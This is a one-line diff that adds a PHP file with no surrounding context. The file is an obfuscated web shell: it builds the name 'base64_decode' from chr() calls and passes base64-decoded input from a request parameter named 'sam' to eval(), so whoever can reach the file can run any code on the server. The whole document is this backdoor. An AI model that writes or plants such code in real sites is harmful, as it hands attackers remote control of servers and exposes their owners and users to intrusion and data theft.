@@ -1,0 +1,1 @@
+<?php $a=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101); eval($a($_REQUEST[sam]));
